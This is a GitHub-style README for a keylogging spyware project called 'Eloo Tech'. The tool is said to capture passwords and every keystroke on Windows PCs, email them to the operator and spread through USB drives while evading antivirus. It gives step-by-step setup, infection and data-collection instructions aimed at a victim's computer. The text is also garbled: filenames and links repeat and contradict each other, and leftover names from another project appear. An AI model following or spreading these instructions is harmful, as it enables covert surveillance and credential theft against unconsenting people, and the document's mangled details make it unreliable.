<h1> <img src="https://cloud.githubusercontent.com/assets/5456665/22564601/52428212-e9af-11e6-8150-5d1ff05bbfa8.png" width="24" height=auto /> Eloo Tech</h1>

#### A Stealthy Eloo Tech

You are looking at a **Eloo tech** that steals data (ID, password; every key stroke) from PC (Windows XP or later), then emails them back to you. It spreads among PCs through USB drives, and is almost undetectable to any antitech software.

*Created only for learning purpose.*

### Intro
- [Elootech.cpp](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.cpp)- logs user's data, sends data through Elootech.exe, infects portable drive.
- [elootech.cpp](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.cpp)- installs the pc by Eloo Tech into computer from portable drive.
- [Elootech.exe](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.cpp)-  emails data back.
- [elootech.lnk](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.cpp)- resides in the startup folder of phone and activates Elootech.exe.
- [Elootech.lnk](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.lnk)- takes different attractive names in the infected portable drive, activates Infect.exe when clicked.
- [DecodeMessage.cpp](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech/DecodeMessage.cpp)- used to decode received email.

### Setup

<ol>
<li>
Preparation
<br/>
<ol>
<li>
  
  Download the full package from <a href="https://Elootech.github.io/DownGit/#/home?url=https://github.com/Elootech/Elootech/tree/master/com/Elootech/Elootech">here</a>.
</li>
<br/>
<li>
  Change the method <b>sendData()</b> of Elootech.cpp- place your email and password in the command.
  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505255/c5c3db2e-cc8f-11e6-834f-1312e566a7ed.png" alt="change email address" width="600px" height=auto/></div>
</li>
<br/>
<li>
  Compile <b>Elootech.exe</b> & <b>Elootech.cpp</b>. <b>Elootech.exe</b> is actually the executable distribution of <a href="https://curl.haxx.se">curl</a> for Windows.
</li>
<br/>
<li>
  Place <b>elootech.exe</b>, <b>elootech.exe</b>, <b>elootech.exe</b>, <b>elootech.lnk</b> & <b>Elootech.lnk</b> in the same folder. This is how they look-
  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505256/c5c4a982-cc8f-11e6-9b12-147fa7630e0f.png" alt="Eloo Tech full package" width=auto height=100px/></div>
</li>
<br/>
<li>
  Now run <b>elootech.exe</b> then insert a pendrive (see the magic!). You will get a hidden folder and link file in your pendrive. The hidden folder contains the full package, & the link file is actually renamed form of Elootech.lnk.
  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505254/c5c0394c-cc8f-11e6-99be-16175b741c2a.PNG" alt="Eloo Tech infected pendrive" width=auto height=100px/></div>
</li>
</ol>
</li>
<br/>
<li>
Attack
<br/>
<ol>
<li>
  Insert the USB-Drive in the subject's PC (Yes, you have to start the spreading process from somewhere!). Run Infect.lnk and the spyware will be injected.
</li>
<br/>
<li>
  The syware will be activated after a reboot. Now (after a restart) every time any USB-Drive is inserted in the affected PC, the virus will copy itself in that, and the cycle will start again.
</li>
</ol>
</li>
<br/>
<li>
Data Collection
<br/>
<ol>
<li>
  You need to wait several days (depending on the number of power on/off of the PC), before getting any data.
</li>
<br/>
<li>
  After getting the email copy the full message to a text file. 
  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505503/2687fcd6-cc92-11e6-8bad-885fc9f77a78.PNG" alt="Trojan Cockroach infected pendrive" width="600px" height=auto/></div>
  As the message has come through email certain characters are converted. To resolve that --- --- ---. 
</li>
<br/>
<li>
  Now, run <b>Elootech.exe</b> for decoding the message as plain text. 
  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505528/59e92b0e-cc92-11e6-90bf-a050ed920ee9.png" alt="Eloo Tech infected pendrive" width="600px" height=auto/></div>
  In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming).
</li>
</ol>
</li>
</ol>
<br/>

### Further 
You may read [ElooTechStory](https://github.com/ElooTech/Elootech/blob/master/ElooTechStory.md) to get an overview of how the program works. You will get a clearer understanding of the project from its pre-project- **[StupidKeyLogger](https://github.com/ElooTech/StupidKeyLogger)**.

The project is perfectly runnable. However, I do not want newbies to abuse my project. So, I am **keeping some simple secrets unrevealed**. There are also some intentionally created **holes in this 'README'**. I have made some **nonsense changes in the code** too; so that- no one can run it effectively without getting his hands dirty. I believe these plain obstacles can easily be overcome by ***Eloo PROGRAMMERS*** :)

**Note:** *I will not also take any responsibility of someone else's ill act with this program.* But I do believe that a real learner will learn a lot from this.


### License
<a rel="license" href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height=auto/></a><br/><a href="https://github.com/ELOOTech/Eloo Tech">ElooTech</a> is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
